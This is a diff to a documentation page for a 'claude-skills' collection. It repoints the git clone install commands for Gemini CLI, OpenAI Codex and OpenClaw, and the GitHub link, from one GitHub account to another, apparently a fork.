@@ -59,26 +59,26 @@ Browse 177 production-ready skills across 9 domains.
 === "Gemini CLI"
 
     ```bash
-    git clone https://github.com/alirezarezvani/claude-skills.git
+    git clone https://github.com/ciciliaETH/claude-skills.git
     cd claude-skills && python3 scripts/sync-gemini-skills.py
     ```
 
 === "OpenAI Codex"
 
     ```bash
-    git clone https://github.com/alirezarezvani/claude-skills.git
+    git clone https://github.com/ciciliaETH/claude-skills.git
     cd claude-skills && python3 scripts/sync-codex-skills.py
     ```
 
 === "OpenClaw"
 
     ```bash
-    git clone https://github.com/alirezarezvani/claude-skills.git
+    git clone https://github.com/ciciliaETH/claude-skills.git
     cd claude-skills && bash scripts/openclaw-install.sh
     ```
 
 [Full Install Guide :octicons-arrow-right-24:](../getting-started.md){ .md-button .md-button--primary }
-[GitHub :fontawesome-brands-github:](https://github.com/alirezarezvani/claude-skills){ .md-button }
+[GitHub :fontawesome-brands-github:](https://github.com/ciciliaETH/claude-skills){ .md-button }
 
 ---
 
